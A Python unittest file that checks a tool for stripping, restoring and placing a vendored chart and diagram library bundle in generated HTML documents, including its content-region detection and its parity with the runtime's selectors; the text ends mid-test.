#!/usr/bin/env python3
"""The vendored rich-libraries blob is carried only when the document can use it (CMH-SIZE-01).

Every document used to carry the ~1,363 KB `cmhVendoredRichLibs` payload unconditionally - 55 to
61 percent of a 2.3 MB file - stamped into the HEAD, on line 7, whether or not the document had a
single mermaid diagram or chart. It is read by exactly one consumer, the offline export, which
already knows when a document needs it.

The measurement trap these tests exist to pin: the review layer's own JavaScript contains the
selector strings `pre.mermaid`, `figure.chart canvas` and friends as STRING LITERALS, so a
detector that scans the whole document reports every document as needing the blob and the feature
silently becomes a no-op. Detection must look only inside the CONTENT region.
"""
import glob
import json
import os
import re
import shutil
import subprocess
import sys
import time
import unittest
from html.parser import HTMLParser

HERE = os.path.dirname(os.path.abspath(__file__))
import _paths  # noqa: E402
sys.path.insert(0, _paths.TOOLS)
import vendored_libs  # noqa: E402
import new_document  # noqa: E402
from checks import parsing  # noqa: E402
from checks import resources  # noqa: E402


def _doc(fragment):
    with open(_paths.TEMPLATE, "r", encoding="utf-8", newline="") as fh:
        template = fh.read()
    return new_document.make_document(template, fragment, key="vendored-libs-test",
                                      label="Vendored", source="doc.html", kind="report")


PROSE = "<h1>Plain</h1>\n<p>No diagrams and no charts at all.</p>"
MERMAID = '<h1>Diagram</h1>\n<pre class="mermaid cm-skip">graph TD; A--&gt;B;</pre>'
CHART = ('<h1>Chart</h1>\n<figure class="chart">'
         '<canvas id="c" class="cmh-chart" data-cmh-chart="{}"></canvas></figure>')


class NeedsDetectionTests(unittest.TestCase):
    """CMH-SIZE-01: whether a document can use the blob is decided from its CONTENT only."""

    def test_a_prose_only_document_does_not_need_the_libraries(self):
        self.assertFalse(vendored_libs.content_needs_rich_libs(_doc(PROSE)))

    def test_a_document_with_a_mermaid_diagram_needs_them(self):
        self.assertTrue(vendored_libs.content_needs_rich_libs(_doc(MERMAID)))

    def test_a_document_with_a_chart_needs_them(self):
        self.assertTrue(vendored_libs.content_needs_rich_libs(_doc(CHART)))

    def test_the_review_layers_own_selector_strings_do_not_count_as_usage(self):
        # THE trap. The built layer JS contains `pre.mermaid, div.mermaid, figure.chart canvas,
        # canvas.cmh-chart` as a literal selector string. A whole-document scan matches it and
        # reports every document as a user, which would make the whole feature a silent no-op.
        html = _doc(PROSE)
        self.assertIn("pre.mermaid", html, "fixture premise: the layer carries the selector text")
        self.assertFalse(vendored_libs.content_needs_rich_libs(html))

    def test_usage_written_after_the_content_region_does_not_count(self):
        # Only the CONTENT region is authored; anything outside it belongs to the layer.
        html = _doc(PROSE).replace("</body>", '<pre class="mermaid">x</pre></body>')
        self.assertFalse(vendored_libs.content_needs_rich_libs(html))

    def test_a_document_with_no_content_markers_is_treated_as_needing_them(self):
        # Fail SAFE: if the region cannot be located we must not strip a payload the document
        # might rely on. A too-large document is a cost; a broken offline export is a defect.
        self.assertTrue(vendored_libs.content_needs_rich_libs("<html><body>hi</body></html>"))


class StripAndRestoreTests(unittest.TestCase):
    """CMH-SIZE-01: the blob is removed when unusable and restored when it becomes usable."""

    def setUp(self):
        with open(os.path.join(_paths.DIST, "SHAREABLE.html"), "r", encoding="utf-8",
                  newline="") as fh:
            self.shareable = fh.read()
        self.blob = vendored_libs.blob_script(self.shareable)
        self.assertTrue(self.blob, "the built SHAREABLE template must carry the blob")

    def test_the_blob_is_removed_from_a_prose_only_document(self):
        html = _doc(PROSE)
        self.assertIsNotNone(vendored_libs.find_blob(html))
        out, changed = vendored_libs.apply(html, self.blob)
        self.assertTrue(changed)
        self.assertIsNone(vendored_libs.find_blob(out))
        self.assertLess(len(out), len(html) - 1000 * 1024, "the saving must be the real payload")

    def test_the_blob_is_kept_for_a_document_that_uses_charts(self):
        html = _doc(CHART)
        out, _changed = vendored_libs.apply(html, self.blob)
        self.assertIsNotNone(vendored_libs.find_blob(out))

    def test_the_blob_is_restored_when_a_document_gains_a_diagram(self):
        # The correctness risk of conditional stamping: a document stripped while it was prose
        # must get the payload back the moment it gains a diagram, or its offline export breaks.
        stripped, _ = vendored_libs.apply(_doc(PROSE), self.blob)
        self.assertIsNone(vendored_libs.find_blob(stripped))
        grew = stripped.replace("</h1>", '</h1>\n<pre class="mermaid cm-skip">graph TD; A--&gt;B;</pre>', 1)
        out, changed = vendored_libs.apply(grew, self.blob)
        self.assertTrue(changed)
        self.assertIsNotNone(vendored_libs.find_blob(out))

    def test_a_restored_blob_is_placed_at_the_end_of_the_body(self):
        # Observability: on line 7 the payload makes the head of the file unreadable to any tool
        # that reads the start of a document.
        stripped, _ = vendored_libs.apply(_doc(PROSE), self.blob)
        grew = stripped.replace("</h1>", '</h1>\n<pre class="mermaid cm-skip">graph TD; A--&gt;B;</pre>', 1)
        out, _ = vendored_libs.apply(grew, self.blob)
        span = vendored_libs.find_blob(out)
        # rfind, not index: the layer's own JS contains the literal "</body>" (it builds export
        # markup), so the FIRST occurrence is not the document's real body end.
        body_end = out.lower().rfind("</body>")
        self.assertGreater(span[0], out.rindex("</main>"),
                           "the restored payload must sit after the document content")
        self.assertLessEqual(span[1], body_end)

    def test_a_head_placed_payload_is_moved_out_of_the_head(self):
        # A document that legitimately needs the payload still should not carry it on line 7.
        html = _doc(CHART)
        head_end = html.lower().find("</head>")
        self.assertLess(vendored_libs.find_blob(html)[0], head_end,
                        "fixture premise: the template stamps the payload into the head")
        out, changed = vendored_libs.apply(html, self.blob)
        self.assertTrue(changed)
        self.assertGreater(vendored_libs.find_blob(out)[0], out.lower().find("</head>"))
        self.assertLessEqual(vendored_libs.find_blob(out)[1], out.lower().rfind("</body>"))

    def test_applying_twice_is_a_no_op(self):
        once, _ = vendored_libs.apply(_doc(PROSE), self.blob)
        twice, changed = vendored_libs.apply(once, self.blob)
        self.assertFalse(changed, "a second pass must not churn the document")
        self.assertEqual(twice, once)

    def test_applying_twice_is_a_no_op_for_a_document_that_keeps_the_payload(self):
        # The relocation must settle: a document that needs the payload is rewritten once and
        # then left byte-identical, or every finalize would churn it.
        once, changed = vendored_libs.apply(_doc(CHART), self.blob)
        self.assertTrue(changed)
        twice, changed_again = vendored_libs.apply(once, self.blob)
        self.assertFalse(changed_again, "an already-placed payload must not be rewritten")
        self.assertEqual(twice, once)

    def test_a_document_that_cannot_be_classified_is_never_grown(self):
        # Fail-safe must mean "leave it alone", NOT "add a payload". A foreign document has no
        # content root at all; inserting 1.3 MB into it would be far worse than doing nothing.
        foreign = "<html><body><p>not one of ours</p></body></html>\n"
        self.assertEqual(vendored_libs.content_state(foreign), vendored_libs.UNKNOWN)
        out, changed = vendored_libs.apply(foreign, self.blob)
        self.assertFalse(changed)
        self.assertEqual(out, foreign)

    def test_a_classifiable_document_without_rich_content_is_never_grown(self):
        # It has a content root and uses nothing, so it is UNUSED - which must mean "strip if
        # present", never "insert". A document that never carried the payload stays as it is.
        minimal = '<html><body><main id="commentRoot">hi</main></body></html>\n'
        self.assertEqual(vendored_libs.content_state(minimal), vendored_libs.UNUSED)
        out, changed = vendored_libs.apply(minimal, self.blob)
        self.assertFalse(changed)
        self.assertEqual(out, minimal)

    def test_stripping_without_a_blob_source_still_works(self):
        # Removal must never depend on having a payload to restore: an agent stripping a
        # document should not need the skill's built template to be reachable.
        out, changed = vendored_libs.apply(_doc(PROSE), None)
        self.assertTrue(changed)
        self.assertIsNone(vendored_libs.find_blob(out))

    def test_a_needed_but_missing_blob_is_left_alone_when_there_is_no_source(self):
        stripped, _ = vendored_libs.apply(_doc(PROSE), None)
        grew = stripped.replace("</h1>", '</h1>\n<pre class="mermaid cm-skip">graph TD; A--&gt;B;</pre>', 1)
        out, changed = vendored_libs.apply(grew, None)
        self.assertFalse(changed, "with no payload available the document must be left as it is")
        self.assertEqual(out, grew)


class RuntimeDifferentialTests(unittest.TestCase):
    """CMH-SIZE-01: the regex detector agrees with the runtime's selectors on every real document.

    The substring parity test below only proves the two mention the same selectors. This one is
    the check that matters: a FALSE NEGATIVE deletes a payload the document's own offline export
    then demands, and fails with "Offline export is missing the vendored Chart.js bundle". So
    run a genuine HTML-parser implementation of the runtime's selector list
    (`pre.mermaid, div.mermaid, figure.chart canvas, canvas.cmh-chart,
    canvas[data-cmh-chart-points], canvas[data-cmh-chart-source]` - declared once in
    `assets/js/03-selectors.js`) over every shipped example's CONTENT region and require the
    fast regex to reach the same verdict.
    """

    class _RuntimeTruth(HTMLParser):
        """An INDEPENDENT implementation of what the runtime exporter looks for.

        It locates `#commentRoot` itself and evaluates the selector list inside it, exactly as
        `68-export-offline.js` does. It deliberately does NOT reuse anything from
        `vendored_libs`, and it deliberately does NOT use the CONTENT markers: the marker span
        is 126 - 514 bytes NARROWER than the root on the shipped examples, so scoping to the
        markers here would compare a different region than production and the differential
        would be worthless.
        """

        def __init__(self):
            HTMLParser.__init__(self, convert_charrefs=False)
            self.stack = []
            self.hit = False
            self._depth = None
            self._in_root = False
            self._done = False

        def handle_starttag(self, tag, attrs):
            attrs = dict(attrs)
            classes = (attrs.get("class") or "").split()
            if tag == "main" and attrs.get("id") == "commentRoot" and self._depth is None:
                self._depth = len(self.stack)
                self._in_root = True
            if self._in_root and not self._done:
                if tag in ("pre", "div") and "mermaid" in classes:
                    self.hit = True
                if tag == "canvas" and "cmh-chart" in classes:
                    self.hit = True
                if tag == "canvas" and any(t == "figure" and "chart" in c for t, c in self.stack):
                    self.hit = True
                if tag == "canvas" and ("data-cmh-chart-points" in attrs or "data-cmh-chart-source" in attrs):
                    self.hit = True
            if tag not in ("br", "img", "input", "meta", "link", "hr", "canvas"):
                self.stack.append((tag, classes))

        def handle_startendtag(self, tag, attrs):
            self.handle_starttag(tag, attrs)
            if tag not in ("br", "img", "input", "meta", "link", "hr", "canvas") \
                    and self.stack and self.stack[-1][0] == tag:
                self.stack.pop()

        def handle_endtag(self, tag):
            for i in range(len(self.stack) - 1, -1, -1):
                if self.stack[i][0] == tag:
                    if tag == "main" and self._depth is not None and i == self._depth:
                        self._in_root = False
                        self._done = True
                    del self.stack[i:]
                    return

    def _runtime_needs(self, html):
        truth = self._RuntimeTruth()
        truth.feed(html)
        truth.close()
        self.assertIsNotNone(truth._depth, "the runtime emulation must find #commentRoot")
        return truth.hit

    def test_the_detector_matches_the_runtime_on_every_shipped_example(self):
        examples = sorted(glob.glob(os.path.join(_paths.EXAMPLES, "*.html")))
        self.assertTrue(examples, "there must be shipped examples to check against")
        checked = 0
        for path in examples:
            with open(path, "r", encoding="utf-8", newline="") as fh:
                html = fh.read()
            expected = vendored_libs.USES if self._runtime_needs(html) else vendored_libs.UNUSED
            self.assertEqual(
                vendored_libs.content_state(html), expected,
                "%s: the author-time detector disagrees with the runtime's selectors. A false "
                "NEGATIVE here strips a payload the document's own offline export needs."
                % os.path.basename(path))
            checked += 1
        self.assertGreaterEqual(checked, 5, "expected the full example corpus, got %d" % checked)

    def test_the_corpus_covers_both_verdicts(self):
        # Guards the test above: if every example landed on the same side it would pass while
        # proving only half the behaviour.
        states = set()
        for path in glob.glob(os.path.join(_paths.EXAMPLES, "*.html")):
            with open(path, "r", encoding="utf-8", newline="") as fh:
                states.add(vendored_libs.content_state(fh.read()))
        self.assertIn(vendored_libs.USES, states)
        self.assertIn(vendored_libs.UNUSED, states)

    def test_escaped_markup_in_prose_is_not_read_as_usage(self):
        # A document ABOUT commentable-html can show `<pre class="mermaid">` as escaped sample
        # text. The runtime sees text, not an element, so the detector must too.
        escaped = '<h1>Docs</h1>\n<p>Write <code>&lt;pre class="mermaid"&gt;</code> to add one.</p>'
        self.assertEqual(vendored_libs.content_state(_doc(escaped)), vendored_libs.UNUSED)


    def test_repeated_finalize_settles_and_the_anchors_survive_decoys(self):
        """The real document contains the literal `</body>` and `</head>` inside its own JS.

        `_insert_before_body_end` / `_is_at_end_of_body` anchor on those strings, so a naive
        `find` would place the payload inside a script. Drive the REAL pipeline repeatedly and
        require it to settle, with the payload genuinely at the end of the document.
        """
        import tempfile
        import finalize

        directory = tempfile.mkdtemp(prefix="cmh-vendored-settle-")
        self.addCleanup(shutil.rmtree, directory, True)
        path = os.path.join(directory, "chart.html")
        with open(path, "w", encoding="utf-8", newline="") as fh:
            fh.write(_doc(CHART))

        sizes, offsets = [], []
        for _ in range(3):
            finalize.finalize(path)
            with open(path, "r", encoding="utf-8", newline="") as fh:
                html = fh.read()
            span = vendored_libs.find_blob(html)
            self.assertIsNotNone(span, "a chart document must keep the payload")
            sizes.append(len(html))
            offsets.append(span[0])
        self.assertEqual(len(set(sizes)), 1, "repeated finalize must not churn the document")
        self.assertEqual(len(set(offsets)), 1, "the payload must not oscillate in position")

        with open(path, "r", encoding="utf-8", newline="") as fh:
            html = fh.read()
        self.assertGreater(html.lower().count("</body>"), 1,
                           "fixture premise: the layer JS carries decoy </body> literals")
        span = vendored_libs.find_blob(html)
        self.assertEqual(html[span[1]:].strip(), "</body>\n</html>".strip(),
                         "the payload must sit immediately before the real end of the document")


class HtmlBlindnessTests(unittest.TestCase):
    """CMH-SIZE-01: detection must not be fooled by markup a regex reads differently to a browser.

    Each case here is a FALSE NEGATIVE - the runtime would use the payload, so stripping it
    leaves the document's own offline export throwing "missing the vendored Chart.js bundle".
    All three were found by review against a real generated, strict-validated document.
    """

    def test_an_unquoted_class_attribute_still_counts_as_usage(self):
        # CSS does not require quotes; `class=cmh-chart` is a valid canvas.cmh-chart.
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<canvas class=cmh-chart id="a"></canvas>')), vendored_libs.USES)

    def test_a_greater_than_inside_an_earlier_attribute_does_not_hide_the_class(self):
        # A `>` inside a quoted attribute value does not end the tag, but a `[^>]*` scan stops
        # there and never reaches the class.
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<canvas title="A &gt; B" class="cmh-chart" id="a"></canvas>'
            .replace("&gt;", ">"))), vendored_libs.USES)

    def test_a_commented_out_end_of_root_does_not_truncate_the_scan(self):
        # A literal `</main>` inside an HTML comment must not be mistaken for the end of the
        # content root, or everything after it stops being scanned.
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<!-- </main> -->\n<canvas class="cmh-chart" id="a"></canvas>')),
            vendored_libs.USES)

    def test_a_commented_out_payload_in_authored_content_is_never_deleted(self):
        # DATA LOSS. A document documenting this very feature can show the payload element as a
        # commented-out example. Treating that as the real payload deletes authored content.
        sample = ('<h1>Docs</h1>\n<p>The payload looks like this:</p>\n'
                  '<!-- <script type="application/json" id="cmhVendoredRichLibs">example</script> -->\n')
        html = _doc(sample)
        self.assertIn("cmhVendoredRichLibs", html)
        first, _ = vendored_libs.apply(html, None)
        second, _ = vendored_libs.apply(first, None)
        self.assertIn("example</script> -->", second,
                      "the commented-out sample is authored content and must not be deleted")
        self.assertEqual(second, first, "a second pass must not delete the commented sample")


    def test_case_sensitivity_follows_css_not_html(self):
        # HTML lowercases TAG names, but class matching in a standards-mode document is
        # case-SENSITIVE, so `class="CMH-CHART"` does not match `canvas.cmh-chart` in the
        # browser either. Reporting it unused is agreement with the runtime, not a miss.
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<CANVAS CLASS="CMH-CHART" ID="a"></CANVAS>')), vendored_libs.UNUSED)
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<CANVAS class="cmh-chart" ID="a"></CANVAS>')), vendored_libs.USES,
            "an uppercase TAG name with a correctly-cased class is still a match")

    def test_a_self_closing_canvas_inside_a_chart_figure_counts(self):
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<figure class="chart"><canvas id="a" /></figure>')), vendored_libs.USES)

    def test_attributes_split_across_lines_still_count(self):
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<canvas\n   class="cmh-chart"\n   id="a"></canvas>')),
            vendored_libs.USES)

    def test_markup_inside_a_script_template_is_text_not_elements(self):
        # querySelector cannot see it, so neither should the detector.
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<script type="text/template">'
            '<figure class="chart"><canvas id="x"></canvas></figure></script>')),
            vendored_libs.UNUSED)

    def test_the_offsets_are_exact_for_every_line_ending(self):
        # The parser maps (line, col) to a character offset through a line table. Get that
        # wrong on CRLF and a 2.3 MB document is silently corrupted when a span is cut out.
        base = _doc(PROSE)
        for label, text in (("LF", base), ("CRLF", base.replace("\n", "\r\n")),
                            ("CR", base.replace("\n", "\r"))):
            span = vendored_libs.find_blob(text)
            self.assertIsNotNone(span, "%s: the payload must be found" % label)
            self.assertTrue(text[span[0]:].startswith("<script "),
                            "%s: the span must start exactly at the element" % label)
            self.assertTrue(text[:span[1]].endswith("</script>"),
                            "%s: the span must end exactly at the element" % label)
            out, changed = vendored_libs.apply(text, None)
            self.assertTrue(changed)
            self.assertEqual(len(text) - len(out), span[1] - span[0],
                             "%s: exactly the payload must be removed, nothing more" % label)


    def test_a_padded_closing_tag_is_cut_completely(self):
        # `</script   >` is valid HTML. Assuming len("</script>") would leave orphaned bytes
        # behind in the document when the payload span is cut out.
        html = _doc(PROSE).replace(
            '</script>\n<link rel="icon"', '</script   >\n<link rel="icon"', 1)
        span = vendored_libs.find_blob(html)
        self.assertIsNotNone(span)
        self.assertTrue(html[:span[1]].rstrip().endswith(">"))
        out, changed = vendored_libs.apply(html, None)
        self.assertTrue(changed)
        self.assertNotIn("</script   >", out,
                         "the padded closing tag must be removed with its element")

    def test_a_bare_chart_canvas_the_live_renderer_draws_keeps_the_payload(self):
        # CMH-CHART-12: `canvas[data-cmh-chart-points]` (and `-source`) is part of the runtime's
        # shared chart selector list, so the live renderer draws it and the exporter provisions
        # for it even without the cmh-chart class. The author-time detector must agree, or the
        # payload the export then demands is stripped.
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<canvas id="a" data-cmh-chart-points="1,2,3"></canvas>')),
            vendored_libs.USES)
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<canvas id="a" data-cmh-chart-source="pts"></canvas>')),
            vendored_libs.USES)

    def test_a_canvas_with_only_a_styling_chart_attribute_is_not_usage(self):
        # `data-cmh-chart-max` alone carries no data, so neither the built-in renderer nor the
        # exporter treats it as a chart. Counting it would keep 1.3 MB in every such document.
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<canvas id="a" data-cmh-chart-max="10"></canvas>')),
            vendored_libs.UNUSED)

    def test_an_authored_payload_example_inside_the_content_is_never_deleted(self):
        # DATA LOSS, found in review. A document can legitimately author a real (not commented)
        # `<script id="cmhVendoredRichLibs">` as an example. The first pass removes the head
        # payload; a second pass must NOT then eat the authored one.
        sample = ('<h1>Docs</h1>\n<p>The payload element:</p>\n'
                  '<script type="application/json" id="cmhVendoredRichLibs">'
                  '{"example":"authored"}</script>\n')
        html = _doc(sample)
        first, _ = vendored_libs.apply(html, None)
        second, changed = vendored_libs.apply(first, None)
        self.assertIn('{"example":"authored"}', second,
                      "an authored payload example is content and must never be deleted")
        self.assertFalse(changed, "the authored example must not be mistaken for the payload")
        self.assertEqual(second, first)

    def test_misnested_chart_markup_a_browser_repairs_still_counts(self):
        # A browser repairs `<p><figure class="chart"></p>...<canvas>` so the canvas ends up
        # inside the figure and the runtime matches it. A token stack does not, so classify on
        # co-occurrence inside the root instead of exact nesting: a false positive keeps bytes,
        # a false negative breaks the export.
        self.assertEqual(vendored_libs.content_state(_doc(
            '<h1>C</h1>\n<p><figure class="chart"></p>\n'
            '<canvas id="a" role="img" aria-label="x"></canvas></figure>')),
            vendored_libs.USES)

    def test_an_unclosed_content_root_is_recovered_rather_than_abandoned(self):
        # A browser closes an unclosed <main> at end of input. Reporting UNKNOWN would refuse to
        # act on a document that renders perfectly well.
        html = ('<html><body><main id="commentRoot">'
                '<canvas class="cmh-chart" id="a"></canvas>')
        self.assertEqual(vendored_libs.content_state(html), vendored_libs.USES)

    def test_a_decoy_body_end_in_a_comment_does_not_receive_the_payload(self):
        # `rfind("</body>")` would pick the comment, hiding a restored 1.3 MB payload inside it
        # where neither the runtime nor find_blob can see it, while apply() reported success.
        with open(os.path.join(_paths.DIST, "SHAREABLE.html"), "r", encoding="utf-8",
                  newline="") as fh:
            blob = vendored_libs.blob_script(fh.read())
        stripped, _ = vendored_libs.apply(_doc(PROSE), blob)
        grew = stripped.replace(
            "</h1>", '</h1>\n<pre class="mermaid cm-skip">graph TD; A--&gt;B;</pre>', 1)
        # Put the decoy AFTER the real end of body. Note the fixture itself has to use rfind:
        # a plain replace(..., 1) patches the first `</body>` LITERAL, which lives inside the
        # layer's own JavaScript - the very confusion this test exists to pin.
        at = grew.rindex("</body>")
        decoyed = grew[:at] + "</body>\n<!-- the docs mention </body> here -->" + grew[at + len("</body>"):]
        out, changed = vendored_libs.apply(decoyed, blob)
        self.assertTrue(changed)
        span = vendored_libs.find_blob(out)
        self.assertIsNotNone(span, "the restored payload must be visible to the parser")
        comment_start = out.index("<!-- the docs mention")
        self.assertLess(span[1], comment_start,
                        "the payload must be placed before the real end of body, not inside "
                        "the decoy comment that follows it")

    def test_every_payload_copy_is_removed_in_one_pass(self):
        # A refresh can leave a stale second copy; one apply must clear them all, or a document
        # keeps a 1.3 MB bundle nobody looks at.
        html = _doc(PROSE)
        span = vendored_libs.find_blob(html)
        doubled = html[:span[1]] + html[span[0]:span[1]] + html[span[1]:]
        out, changed = vendored_libs.apply(doubled, None)
        self.assertTrue(changed)
        self.assertIsNone(vendored_libs.find_blob(out))
        self.assertNotIn('id="cmhVendoredRichLibs">{"encoding"', out)


    def test_a_rich_document_is_collapsed_to_exactly_one_payload_copy(self):
        # The runtime resolves the payload as infrastructure and refuses to guess between two
        # candidates (CMH-OFFLINE-08), so a rich document left with a stale second copy would be
        # un-exportable. Finalize must heal it, and the next run must be a no-op.
        html = _doc(CHART)
        span = vendored_libs.find_blob(html)
        doubled = html[:span[1]] + html[span[0]:span[1]] + html[span[1]:]
        self.assertEqual(doubled.count('id="cmhVendoredRichLibs"'), 2)
        blob = html[span[0]:span[1]]
        out, changed = vendored_libs.apply(doubled, blob)
        self.assertTrue(changed)
        self.assertEqual(out.count('id="cmhVendoredRichLibs"'), 1)
        self.assertIsNotNone(vendored_libs.find_blob(out))
        again, changed_again = vendored_libs.apply(out, blob)
        self.assertFalse(changed_again)
        self.assertEqual(again, out)


class RuntimeParityTests(unittest.TestCase):
    """CMH-SIZE-01 / CMH-CHART-12 / CMH-PRINT-07: one shared selector definition, pinned.

    The runtime declares its rich-content selectors ONCE, in `assets/js/03-selectors.js`, and the
    exporter, the live chart renderer, the PRINT surfaces, and this module's `RUNTIME_SELECTORS`
    all derive from it. These tests pin that: the constants resolve to exactly `RUNTIME_SELECTORS`,
    the exporter's usage functions query the constants rather than re-typing a literal list, the
    renderer's set is a SUBSET of the exporter's so anything drawn live is provisioned for on
    export, and the two print surfaces cap exactly the shared mermaid host set.
    """

    _CONST_RE = re.compile(r"^const (CMH_[A-Z0-9_]+)\s*=\s*(.+?);\s*$", re.M | re.S)

    def _read(self, *parts):
        path = os.path.join(_paths.DEV, "assets", "js", *parts)
        with open(path, "r", encoding="utf-8", newline="") as fh:
            return fh.read()

    def _read_css(self, *parts):
        path = os.path.join(_paths.DEV, "assets", "css", *parts)
        with open(path, "r", encoding="utf-8", newline="") as fh:
            return fh.read()

    def _scan_js(self, source):
        """Split JavaScript source into (string-literal contents, code-with-literals-blanked).

        One scan serves both print checks. Literals matter because a re-typed selector can only
        reach the browser through one; the blanked copy matters because `measureCss()`'s CSS
        strings are full of `{`/`}` that would wreck a naive brace match, and because a comment
        that merely NAMES an identifier must not be able to stand in for the code that used it.
        Walking the source keeps quotes and comments straight, where a regex stripper would either
        miss a trailing `//` (false red) or eat a `/*` inside a string (false green).

        REGEX LITERALS ARE NOT MODELLED - they also open with `/`, and one containing a quote
        would flip this scanner into a bogus string and silently swallow real code, which is the
        false-GREEN direction. That is why the scan self-checks below rather than trusting itself:
        a guard against silent drift must not drift silently. `68-export-offline.js`, two sibling
        tests away, already contains such literals, so this is a live maintenance trap and not a
        theoretical one.
        """
        literals, code, i, n = [], [], 0, len(source)
        while i < n:
            ch = source[i]
            if ch == "/" and i + 1 < n and source[i + 1] == "/":
                end = source.find("\n", i)
                end = n if end == -1 else end
                code.append(" " * (end - i))
                i = end
            elif ch == "/" and i + 1 < n and source[i + 1] == "*":
                end = source.find("*/", i + 2)
                self.assertNotEqual(end, -1, "unterminated block comment; the JS scanner cannot "
                                             "read this file, so nothing below can be trusted")
                end += 2
                code.append(" " * (end - i))
                i = end
            elif ch in "\"'`":
                quote, start, i, buf = ch, i, i + 1, []
                while i < n and source[i] != quote:
                    if source[i] == "\\":
                        i += 1
                    if i < n:
                        buf.append(source[i])
                    i += 1
                self.assertLess(i, n, "unterminated string literal; the JS scanner cannot read "
                                      "this file (a regex literal it mistook for a quote?), so "
                                      "nothing below can be trusted")
                i += 1
                literal = "".join(buf)
                if quote != "`":
                    # JS forbids a raw newline in a '' or "" literal, so one here means the scan
                    # desynchronized and is swallowing real code - exactly how a smuggled host
                    # would go unseen. Fail loudly instead of reporting nothing.
                    self.assertNotIn("\n", literal,
                                     "the JS scanner produced a multi-line %s literal, so it has "
                                     "lost track of this file (a regex literal?); teach it the "
                                     "construct rather than trusting these checks" % quote)
                literals.append(literal)
                code.append(" " * (i - start))
            else:
                code.append(ch)
                i += 1
        code = "".join(code)
        # Blanking is length-preserving by construction on every branch; `_function_body` slices
        # by these indices, so assert it rather than assume it.
        self.assertEqual(len(code), len(source), "the JS scanner changed the source length")
        self.assertEqual(code.count("{"), code.count("}"),
                         "braces do not balance after blanking; the JS scanner cannot read this "
                         "file, so any function body it extracts is the wrong span")
        return literals, code

    def _function_body(self, code, name):
        """Return the brace-balanced body of `function <name>(...)` from BLANKED code.

        `code` must be the strings-and-comments-blanked copy from `_scan_js`, for two reasons.
        Braces inside `measureCss()`'s CSS strings would wreck a naive brace match; and an
        assertion about what a function DOES must not be satisfiable by a comment that merely
        NAMES the identifier - commenting out the live read and the live call while leaving both
        words visible in prose is exactly the false green this returns blanked text to prevent.
        """
        start = code.find("function " + name + "(")
        self.assertNotEqual(start, -1,
                            "the runtime no longer defines %s(); this check is stale and must be "
                            "re-pointed at whatever replaced it" % name)
        open_brace = code.find("{", start)
        self.assertNotEqual(open_brace, -1, "%s() has no body" % name)
        depth = 0
        for i in range(open_brace, len(code)):
            if code[i] == "{":
                depth += 1
            elif code[i] == "}":
                depth -= 1
                if depth == 0:
                    return code[open_brace + 1:i]
        self.fail("%s() body is not brace-balanced" % name)

    @staticmethod
    def _strip_css_comments(css):
        """CSS has only `/* */`. The prose above a rule explains which hosts it caps, so leaving
        comments in would let a comment SATISFY a check about the selector - the false green that
        makes a drift guard worthless."""
        return re.sub(r"/\*.*?\*/", " ", css, flags=re.S)

    def _mermaid_hosts(self):
        hosts = self._selector_constants().get("CMH_MERMAID_SEL")
        self.assertTrue(hosts,
                        "the runtime no longer declares CMH_MERMAID_SEL (or declares it empty); "
                        "the print parity checks are stale and must be re-pointed at whatever "
                        "replaced it")
        # `_printMermaidCapSel()` in 83-print.js derives the print cap by splitting this constant
        # on "," and wrapping each part, and this file's CSS pin matches one `<element>.<class>`
        # token per host. A host carrying a nested comma (`:is(pre,div).mermaid`, an attribute
        # selector) or no element prefix would break one or both silently, and a single invalid
        # selector makes a browser drop the ENTIRE tall-media rule - which also caps figures and
        # images. Fail loudly here instead, so the vocabulary cannot outgrow its consumers
        # without anyone noticing.
        for host in hosts:
            self.assertRegex(
                host, r"^[A-Za-z][\w-]*\.[\w-]+$",
                "CMH_MERMAID_SEL host %r is no longer a flat `<element>.<class>` selector. Two "
                "things depend on that shape: the comma-splitting derivation in "
                "_printMermaidCapSel() (assets/js/83-print.js), and the CSS pin in this file, "
                "which scans 92-print.css for one such token per host. Teach whichever of them "
                "the new shape rather than leaving the runtime to emit an invalid selector that "
                "drops the whole cap." % host)
        return hosts

    def _selector_constants(self):
        """Resolve `03-selectors.js` into {constant name: [selector, ...]}.

        The values are string literals concatenated with earlier constants, so evaluate them in
        declaration order rather than assuming any one shape - a future constant built from two
        others must resolve too, or this check silently stops covering it. Tokens are scanned
        rather than split on `+`, because `+` is also a CSS sibling combinator.
        """
        source = self._read("03-selectors.js")
        term_re = re.compile(r"\"([^\"]*)\"|'([^']*)'|`([^`]*)`|([A-Za-z_$][\w$]*)")
        values = {}
        for name, expr in self._CONST_RE.findall(source):
            out = []
            for m in term_re.finditer(expr):
                literal = next((g for g in m.groups()[:3] if g is not None), None)
                if literal is not None:
                    out.append(literal)
                    continue
                ref = m.group(4)
                self.assertIn(ref, values,
                              "%s is built from %r, which is not a string literal or an "
                              "already-declared selector constant" % (name, ref))
                out.append(values[ref])
            values[name] = "".join(out)
        self.assertTrue(values, "no selector constants found in 03-selectors.js")
        # A declaration this parser could not read would be silently DROPPED, and the parity check
        # would keep passing while that selector quietly stopped being pinned - the exact silent
        # regression these tests exist to prevent. Fail loudly instead.
        self.assertEqual(
            len(values), len(re.findall(r"^const CMH_[A-Z0-9_]+\s*=", source, re.M)),
            "a selector constant in 03-selectors.js was not parsed; teach _CONST_RE its shape "
            "rather than leaving it unpinned")
        return {name: [p.strip() for p in value.split(",") if p.strip()]
                for name, value in values.items()}

    def test_the_selector_set_matches_the_runtimes_exactly(self):
        """Two-directional: catches the runtime ADDING a selector, not just removing one.

        Asserting only that the known selectors are still present would keep passing if someone
        taught the exporter a NEW chart shape while the stripper silently missed it - exactly the
        false negative that deletes a payload the export then demands. Nothing is filtered on the
        words "chart"/"mermaid" either: a keyword filter would silently drop a future selector
        such as `canvas[data-cmh-visual]` and quietly re-open the hole this test exists to close.
        """
        consts = self._selector_constants()
        self.assertIn("CMH_RICH_CONTENT_SEL", consts,
